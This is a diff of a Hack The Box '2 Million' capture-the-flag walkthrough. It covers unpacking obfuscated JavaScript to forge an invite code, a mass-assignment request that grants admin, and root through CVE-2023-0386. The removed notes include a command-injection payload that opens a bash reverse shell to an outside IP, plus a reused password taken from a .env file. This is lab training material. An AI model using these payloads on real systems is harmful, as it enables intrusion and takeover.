@@ -1,177 +1,7 @@
-**STEPS TAKEN**
-
-Ran an nmap scan to detect open ports, after which I added -sCV for the open ports
-
-
-
-Saw a login page, tried SQLi, didn't work
-
-Saw a join button, decided to try to register, maybe I can gain admin access if the backend trusts user input (user id), nothing
-
-All this was being done in burp suite, while intercepting traffic. Saw that a query was made to /js/inviteapi.min.js
-
-Copied that url, pasted to another tab on chromium and saw an obfuscated js, used https://deobfuscate.relative.im/ to deobfuscate, still didn't real like normal code,but I noticed it was packed (learnt this in one of the previous courses I've taken on HTB --free)
-So, I copied the output from https://deobfuscate.relative.im/ to https://matthewfl.com/unPacker.html to unpack, and there, a js code that makes sense
-
-From the js code, saw two functions, and the second (make invite code) contains a path on how I can make invite code
-
-It also stated that the method has to be post, and data should be json
-Again, sent a post request to it in burp (repeater) an encrypted message in response, ROT13 was specified as the encryption type
-So, I copied the data, pasted it at https://rot13.com/ to get the plaintext and it said: In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
-
-
-So now, I know I have to make a post request to that url, made the post request, using curl this time (easier) and I got a response, it was also stated that the code is encoded, looking at it, it ends with =, a huge sign of base64 encoding, sure enough, I got an invite code, time to create an account
-
-Created an account, and now I'm logged in
-
-
-Scrolling through the pages here doesn't reveal much, we have the changelog page which hints us about the version of services running there, 2017, probably a public exploit
-
-
-At this point, I didn't know what to do, played around, one thing struck me about the connection tab though, played around with the repeater a bit, trying to access different endpoints till I stumbled on /api/v1 which gave 200 and listed all the available endpoints, giving me a broad view of the website. Saw different categories, the ones that stood out are the admin api endpoints, knew something fishy is definitely going down:
-
-
-
-"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}
-
-
-Checked admin/auth, got a message: false, of course we're not an admin. Tried vpn/generate, got a 401, unauthorized. That leaves me with only settings/update, got an invalid content file, remember we said earlier that is accepts json, modified the request to use json, and now we got a missing parameter email, added the main I used to open the account, retried and now got missing parameter is_admin, after which we got a pleasant response, looks like we're now admin, let's verify with /admin/auth, and we got a true!!!!!!!!!!!
-
-And now that we're admin, what can we do, nothing seems interesting, switched to guided mode to see what is going on and there, I can see that an api endpoint has command injection vulnerability in it, I'll just try one at a time. It has to be one of those endpoints that take an input generate or update
-
-
-Ran into a little trouble and I had to generate a new cookie. And confirmed, the /api/v1/admin/generate endpoint is vulnerable to command injection, sent this:
-
-{
-	"username":"Adeking$(bash -c 'bash -i >& /dev/tcp/10.10.17.12/4444 0>&1')"
-}
-And now, I have a shell, upgrade and import xterm
-python3 -c "import pty; pty.spawn('/bin/bash')"
-
-
-On getting the terminal, ran ls, checked the content of Database.php and .env, found a username and a password belonging to admin (SuperDuperPass123), used in database, it was reused for the admin user account, sshed into admin and got the user flag
-
-
-
-Now to escalate privilege, I first checked if admin can run any command as sudo using sudo -l, got: Sorry, user admin may not run sudo on localhost.
-Ran: find / -user admin 2>/dev/null | grep -v '/proc\|^/run\|^/sys' 
-
-Checked the content of the files and directory, found a mail about a public exploit, and yes, we were right all along.
-
-Searched about the exploit, found this github repo: https://github.com/puckiestyle/CVE-2023-0386/
-Followed the readme.md and got a root shell
-
-
-
-
-
-
-
-
-function verifyInviteCode(code)
-	{
-	var formData=
-		{
-		"code":code
-	};
-	$.ajax(
-		{
-		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
-			{
-			console.log(response)
-		}
-		,error:function(response)
-			{
-			console.log(response)
-		}
-	}
-	)
-}
-function makeInviteCode()
-	{
-	$.ajax(
-		{
-		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
-			{
-			console.log(response)
-		}
-		,error:function(response)
-			{
-			console.log(response)
-		}
-	}
-	)
-}
-
-curl -X POST http://2million.htb/api/v1/invite/how/to/generate
-
-
-In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
-
-
-
-PUT /api/v1/admin/settings/update HTTP/1.1
-Host: 2million.htb
-Accept-Language: en-US,en;q=0.9
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://2million.htb/home
-Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=vjrhrqptcbq955o8s1h6qo8g3u
-Content-Type: application/json
-Connection: keep-alive
-Content-Length: 43
-
-{
-	"email":"123@123.com",
-"is_admin":1
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# HTB "2 Million" — Full Walkthrough (Beginner-Friendly)
+# HTB "2 Million" — Full Walkthrough
 
 **Author:** pytha90ras
-**Difficulty:** Medium
+**Difficulty:** Easy
 **Category:** Web Exploitation → Privilege Escalation
 **Chain:** Invite Code Bypass → Mass Assignment → OS Command Injection → Credential Reuse → Kernel Exploit (CVE-2023-0386)
 
@@ -232,12 +62,10 @@ I grabbed the file directly:
 curl -s http://2million.htb/js/inviteapi.min.js
 ```
 
-Or just opened the URL in a new browser tab. The code was minified/obfuscated — unreadable at first glance. I recognized the pattern from a previous HTB Academy module: this is classic **"packed" JavaScript** (a common obfuscation technique where the real code is compressed into a data blob and unpacked by a small runtime function).
-
 Steps to make it readable:
 
-1. Pasted the obfuscated code into **https://deobfuscate.relative.im/** — this cleaned it up a bit but the output still didn't look like normal JS, just less mangled.
-2. Took *that* output and pasted it into **https://matthewfl.com/unPacker.html**, which specifically reverses the "packer" format. This time, the result was clean, readable JavaScript.
+1. Pasted the obfuscated code into https://deobfuscate.relative.im/ — this cleaned it up a bit but the output still didn't look like normal JS, just less mangled.
+2. Took *that* output and pasted it into https://matthewfl.com/unPacker.html , which specifically reverses the "packer" format. This time, the result was clean, readable JavaScript.
 
 The unpacked code revealed two functions:
 
@@ -455,7 +283,7 @@ cat Database.php
 cat .env
 ```
 
-These files contained a **username and password for the admin database user** (`SuperDuperPass123` in this case — obviously change this for your own run, since credentials are randomized per instance). 
+These files contained a **username and password for the admin database user** (`Super**GET_YOURS**Pass123'). 
 
 **The key realization:** this password was for the *database* connection — but it turned out the same admin **system** user reused it as their login password too. Credential reuse across different systems/purposes is extremely common in real environments, and it's always worth testing a found password against SSH, the underlying OS user, or any other login you can reach.
 
